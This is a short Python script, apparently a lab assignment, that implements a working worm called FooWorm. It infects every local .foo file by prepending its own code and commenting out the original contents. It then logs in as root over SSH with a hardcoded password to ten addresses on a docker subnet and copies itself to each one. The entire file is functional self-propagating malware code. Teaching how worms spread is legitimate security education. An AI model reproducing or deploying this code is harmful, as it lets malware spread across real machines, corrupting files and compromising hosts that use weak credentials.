#!/usr/bin/env python
import sys
import os
import glob
import random
import paramiko
import scp

##   FooWorm.py
print("-------------Running FooWorm (task1)------------")

IN = open(sys.argv[0], 'r')
worm = [line for (i,line) in enumerate(IN) if i < 58]

for item in glob.glob("*.foo"):
    IN = open(item, 'r')
    all_of_it = IN.readlines()
    IN.close()
    if any('fooworm' in line for line in all_of_it): continue
    os.chmod(item, 0o777)    
    OUT = open(item, 'w')
    OUT.writelines(worm)
    all_of_it = ['#' + line for line in all_of_it]
    OUT.writelines(all_of_it)
    OUT.close()
print("Done infecting foo files on localhost")

# Add networking capabilities.
# The following code will generate a list of target IP addresses
# Each IP address is a docker container running on the same host
# The modified FooWorm will connect to each container and copy itself
# It won't run on the containers, becase that's not part of task1.
def get_target_ips():
    return [f'172.17.0.{ip}' for ip in range(2, 12, 1)]

for ip_address in get_target_ips():
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ip_address,port=22,username='root',password='mypassword',timeout=5)
        scpcon = scp.SCPClient(ssh.get_transport())
        print(f"Connected to host: {ip_address}\n")
        scpcon.put(sys.argv[0], 'FooVirusPlus.py')
        print(f"Done copying itself on host: {ip_address}\n")              
        scpcon.close()
    except Exception as e:
        print(e)
        continue
